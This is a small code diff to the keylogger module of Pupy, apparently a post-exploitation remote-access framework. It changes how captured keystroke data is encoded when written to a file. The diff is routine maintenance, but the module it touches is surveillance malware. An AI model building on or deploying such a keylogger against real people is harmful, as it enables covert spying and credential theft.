@@ -6,6 +6,7 @@ from __future__ import print_function
 from __future__ import unicode_literals
 
 from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
+from network.lib.convcompat import as_unicode_string
 
 from io import open
 
@@ -92,9 +93,7 @@ class KeyloggerModule(PupyModule):
                 self.log(data)
 
                 with open(filepath, 'w') as f:
-                    if not isinstance(data, bytes):
-                        data = data.encode('utf-8')
-                    f.write(data)
+                    f.write(as_unicode_string(data))
 
         elif args.action=="stop":
             if self.client.is_windows():
